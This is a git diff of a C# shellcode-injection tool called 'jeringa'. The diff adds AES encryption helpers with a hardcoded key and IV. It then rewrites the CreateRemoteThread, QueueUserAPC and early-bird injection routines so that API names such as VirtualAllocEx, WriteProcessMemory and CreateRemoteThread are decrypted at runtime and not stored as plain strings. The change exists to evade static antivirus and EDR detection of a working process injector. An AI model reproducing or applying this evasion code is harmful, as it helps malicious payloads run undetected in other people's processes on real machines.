@@ -4,8 +4,9 @@ using System.Linq;
 using System.Diagnostics;
 using System.Security.Principal;
 using System.Collections.Generic;
+using System.Security.Cryptography;
 using System.Runtime.InteropServices;
-
+using System.Text;
 
 namespace jeringa
 {
@@ -54,6 +55,93 @@ namespace jeringa
         delegate uint ResumeThreadDelegate(IntPtr hThread);
         delegate IntPtr OpenThreadDelegate(uint dwDesiredAccess, bool bInheritHandle, uint dwThreadId);
 
+        static String EncryptStringToBytes(string plainText, byte[] Key, byte[] IV)
+        {
+            // Check arguments. 
+            if (plainText == null || plainText.Length <= 0)
+                throw new ArgumentNullException("plainText");
+            if (Key == null || Key.Length <= 0)
+                throw new ArgumentNullException("Key");
+            if (IV == null || IV.Length <= 0)
+                throw new ArgumentNullException("IV");
+            byte[] encrypted;
+            // Create an RijndaelManaged object 
+            // with the specified key and IV. 
+            using (RijndaelManaged rijAlg = new RijndaelManaged())
+            {
+                rijAlg.Key = Key;
+                rijAlg.IV = IV;
+
+                // Create a decryptor to perform the stream transform.
+                ICryptoTransform encryptor = rijAlg.CreateEncryptor(rijAlg.Key, rijAlg.IV);
+
+                // Create the streams used for encryption. 
+                using (MemoryStream msEncrypt = new MemoryStream())
+                {
+                    using (CryptoStream csEncrypt = new CryptoStream(msEncrypt, encryptor, CryptoStreamMode.Write))
+                    {
+                        using (StreamWriter swEncrypt = new StreamWriter(csEncrypt))
+                        {
+
+                            //Write all data to the stream.
+                            swEncrypt.Write(plainText);
+                        }
+                        encrypted = msEncrypt.ToArray();
+                    }
+                }
+            }
+
+
+            // Return the encrypted bytes from the memory stream. 
+            return Convert.ToBase64String(encrypted);
+
+        }
+
+        static string DecryptStringFromBytes(String cipherTextEncoded, byte[] Key, byte[] IV)
+        {
+            byte[] cipherText = Convert.FromBase64String(cipherTextEncoded);
+            // Check arguments. 
+            if (cipherText == null || cipherText.Length <= 0)
+                throw new ArgumentNullException("cipherText");
+            if (Key == null || Key.Length <= 0)
+                throw new ArgumentNullException("Key");
+            if (IV == null || IV.Length <= 0)
+                throw new ArgumentNullException("IV");
+
+            // Declare the string used to hold 
+            // the decrypted text. 
+            string plaintext = null;
+
+            // Create an RijndaelManaged object 
+            // with the specified key and IV. 
+            using (RijndaelManaged rijAlg = new RijndaelManaged())
+            {
+                rijAlg.Key = Key;
+                rijAlg.IV = IV;
+
+                // Create a decrytor to perform the stream transform.
+                ICryptoTransform decryptor = rijAlg.CreateDecryptor(rijAlg.Key, rijAlg.IV);
+
+                // Create the streams used for decryption. 
+                using (MemoryStream msDecrypt = new MemoryStream(cipherText))
+                {
+                    using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
+                    {
+                        using (StreamReader srDecrypt = new StreamReader(csDecrypt))
+                        {
+
+                            // Read the decrypted bytes from the decrypting stream 
+                            // and place them in a string.
+                            plaintext = srDecrypt.ReadToEnd();
+                        }
+                    }
+                }
+
+            }
+
+            return plaintext;
+
+        }
         private static string getProcessOwner(Process process)
         {
             IntPtr processHandle = IntPtr.Zero;
@@ -129,11 +217,23 @@ namespace jeringa
         {
             // Delegates 
             IntPtr k32 = GetModuleHandle("kernel32.dll");
-            
-            IntPtr addrOpenProcess = GetProcAddress(k32, "OpenProcess");
-            IntPtr addrVirtualAllocEx = GetProcAddress(k32, "VirtualAllocEx");
-            IntPtr addrWriteProcessMemory = GetProcAddress(k32, "WriteProcessMemory");
-            IntPtr addrCreateRemoteThread = GetProcAddress(k32, "CreateRemoteThread");
+
+            RijndaelManaged myRijndael = new RijndaelManaged();
+            String password = "ricardojoserf   ";
+            String iv = "jeringa jeringa ";
+
+            // String encrypted = EncryptStringToBytes("QueueUserAPC", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
+            // Console.WriteLine(encrypted);
+
+            String decryptedOpenProcess = DecryptStringFromBytes("ZlWSQ5AeZIU0Z/vLWqlQmw==", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
+            String decryptedVirtualAllocEx = DecryptStringFromBytes("3VykPNLrF3zOBfq50x+yew==", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
+            String decryptedWriteProcessMemory = DecryptStringFromBytes("/nDO1wIStpfXAWtzJEfxi3MplH2K7Wg0M+ZmtjnkI08=", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
+            String decryptedCreateRemoteThread = DecryptStringFromBytes("EcLQmi+4wHc4weGwjNgqCQe+1LyC2VMgE3xKs7JyhZY=", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
+
+            IntPtr addrOpenProcess = GetProcAddress(k32, decryptedOpenProcess);
+            IntPtr addrVirtualAllocEx = GetProcAddress(k32, decryptedVirtualAllocEx);
+            IntPtr addrWriteProcessMemory = GetProcAddress(k32, decryptedWriteProcessMemory);
+            IntPtr addrCreateRemoteThread = GetProcAddress(k32, decryptedCreateRemoteThread);
             
             OpenProcessDelegate auxOpenProcess = (OpenProcessDelegate)Marshal.GetDelegateForFunctionPointer(addrOpenProcess, typeof(OpenProcessDelegate));
             VirtualAllocExDelegate auxVirtualAllocEx = (VirtualAllocExDelegate)Marshal.GetDelegateForFunctionPointer(addrVirtualAllocEx, typeof(VirtualAllocExDelegate));
@@ -189,13 +289,25 @@ namespace jeringa
 
         static void injectShellcodeQueueUserAPC(String processPID, String payload)
         {
+
+            // Delegates 
             IntPtr k32 = GetModuleHandle("kernel32.dll");
 
-            IntPtr addrOpenProcess = GetProcAddress(k32, "OpenProcess");
-            IntPtr addrVirtualAllocEx = GetProcAddress(k32, "VirtualAllocEx");
-            IntPtr addrWriteProcessMemory = GetProcAddress(k32, "WriteProcessMemory");
-            IntPtr addrQueueUserAPC = GetProcAddress(k32, "QueueUserAPC");
-            IntPtr addrOpenThread = GetProcAddress(k32, "OpenThread");
+            RijndaelManaged myRijndael = new RijndaelManaged();
+            String password = "ricardojoserf   ";
+            String iv = "jeringa jeringa ";
+
+            String decryptedOpenProcess = DecryptStringFromBytes("ZlWSQ5AeZIU0Z/vLWqlQmw==", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
+            String decryptedVirtualAllocEx = DecryptStringFromBytes("3VykPNLrF3zOBfq50x+yew==", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
+            String decryptedWriteProcessMemory = DecryptStringFromBytes("/nDO1wIStpfXAWtzJEfxi3MplH2K7Wg0M+ZmtjnkI08=", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
+            String decryptedQueueUserAPC = DecryptStringFromBytes("cd7xBomTOk7mvZ7UxBJDaQ==", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
+            String decryptedOpenThread = DecryptStringFromBytes("ATZJvFQXpEJm5R5ff90mOA==", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
+
+            IntPtr addrOpenProcess = GetProcAddress(k32, decryptedOpenProcess);
+            IntPtr addrVirtualAllocEx = GetProcAddress(k32, decryptedVirtualAllocEx);
+            IntPtr addrWriteProcessMemory = GetProcAddress(k32, decryptedWriteProcessMemory);
+            IntPtr addrQueueUserAPC = GetProcAddress(k32, decryptedQueueUserAPC);
+            IntPtr addrOpenThread = GetProcAddress(k32, decryptedOpenThread);
             
             OpenProcessDelegate auxOpenProcess = (OpenProcessDelegate)Marshal.GetDelegateForFunctionPointer(addrOpenProcess, typeof(OpenProcessDelegate));
             VirtualAllocExDelegate auxVirtualAllocEx = (VirtualAllocExDelegate)Marshal.GetDelegateForFunctionPointer(addrVirtualAllocEx, typeof(VirtualAllocExDelegate));
@@ -264,13 +376,22 @@ namespace jeringa
         {
             // Delegates
             IntPtr k32 = GetModuleHandle("kernel32.dll");
-            Console.WriteLine(k32);
 
-            IntPtr addrCreateProcess = GetProcAddress(k32, "CreateProcessA");
-            IntPtr addrVirtualAllocEx = GetProcAddress(k32, "VirtualAllocEx");
-            IntPtr addrWriteProcessMemory = GetProcAddress(k32, "WriteProcessMemory");
-            IntPtr addrQueueUserAPC = GetProcAddress(k32, "QueueUserAPC");
-            IntPtr addrResumeThread = GetProcAddress(k32, "ResumeThread");
+            RijndaelManaged myRijndael = new RijndaelManaged();
+            String password = "ricardojoserf   ";
+            String iv = "jeringa jeringa ";
+
+            String decryptedCreateProcessA = DecryptStringFromBytes("2FXtT/hu7ZEj8oz79680TQ==", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
+            String decryptedVirtualAllocEx = DecryptStringFromBytes("3VykPNLrF3zOBfq50x+yew==", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
+            String decryptedWriteProcessMemory = DecryptStringFromBytes("/nDO1wIStpfXAWtzJEfxi3MplH2K7Wg0M+ZmtjnkI08=", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
+            String decryptedQueueUserAPC = DecryptStringFromBytes("cd7xBomTOk7mvZ7UxBJDaQ==", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
+            String decryptedResumeThread = DecryptStringFromBytes("uINo0LSuz3QttywZS2AsBw==", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
+
+            IntPtr addrCreateProcess = GetProcAddress(k32, decryptedCreateProcessA);
+            IntPtr addrVirtualAllocEx = GetProcAddress(k32, decryptedVirtualAllocEx);
+            IntPtr addrWriteProcessMemory = GetProcAddress(k32, decryptedWriteProcessMemory);
+            IntPtr addrQueueUserAPC = GetProcAddress(k32, decryptedQueueUserAPC);
+            IntPtr addrResumeThread = GetProcAddress(k32, decryptedResumeThread);
 
             CreateProcessDelegate auxCreateProcess = (CreateProcessDelegate)Marshal.GetDelegateForFunctionPointer(addrCreateProcess, typeof(CreateProcessDelegate));
             VirtualAllocExDelegate auxVirtualAllocEx = (VirtualAllocExDelegate)Marshal.GetDelegateForFunctionPointer(addrVirtualAllocEx, typeof(VirtualAllocExDelegate));
@@ -384,10 +505,34 @@ namespace jeringa
             string option = args[0];
             string process_str = args[1];
 
+            
+
+            /*
+            using (RijndaelManaged myRijndael = new RijndaelManaged())
+            {
+
+                // myRijndael.GenerateKey();
+                String password = "ricardojoserf-je";
+                myRijndael.GenerateIV();
+                // Encrypt the string to an array of bytes. 
+                // byte[] encrypted = EncryptStringToBytes("openProcess", myRijndael.Key, myRijndael.IV);
+                String encrypted = EncryptStringToBytes("openProcess", Encoding.ASCII.GetBytes(password), myRijndael.IV);
+                // Decrypt the bytes to a string. 
+                // string roundtrip = DecryptStringFromBytes(encrypted, myRijndael.Key, myRijndael.IV);
+                String roundtrip = DecryptStringFromBytes(encrypted, Encoding.ASCII.GetBytes(password), myRijndael.IV);
+                //Display the original data and the decrypted data.
+                Console.WriteLine("Original:   {0}", "openProcess");
+                Console.WriteLine("Encrypted:  {0}", encrypted);
+                Console.WriteLine("Round Trip: {0}", roundtrip);
+
+            }
+            */
+
             if (option == "list")
             {
                 Dictionary<string, string> processPIDs = getProcessPids(process_str);
                 listInfo(processPIDs);
+                
             }
 
             else if (option == "inject-crt")
